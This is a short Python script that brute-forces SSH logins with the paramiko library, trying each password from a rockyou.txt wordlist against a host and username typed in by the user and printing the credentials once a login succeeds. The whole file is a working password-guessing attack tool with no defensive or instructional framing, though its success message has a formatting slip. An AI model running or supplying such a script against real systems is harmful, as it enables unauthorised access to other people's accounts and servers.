from socket import socket
from time import sleep

import paramiko


def start():
  host = input("What is the Host? ")
  username =  input("What is the Username? ")
  print(host)
  f = open('./rockyou.txt', 'r')
  passwords = f.readlines()
  
  for password in passwords:
    connected = attempt_to_login(host, username, password.rstrip())  
    if connected:
      sleep(5)
      return


def attempt_to_login(host: str, username: str, password: str):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f'[-] --- Attempting to login with {host}, {username}, {password}')
    ssh.connect(host, username=username, password=password)
    ssh.close()
    print('[!] SUCCESSFULL CONNTION WITH {username}@{host} :password {password}')
    return True
  except paramiko.AuthenticationException:
    print('Invalid credentials bad username or password')
  except:
    print("something when wrong")
  return False
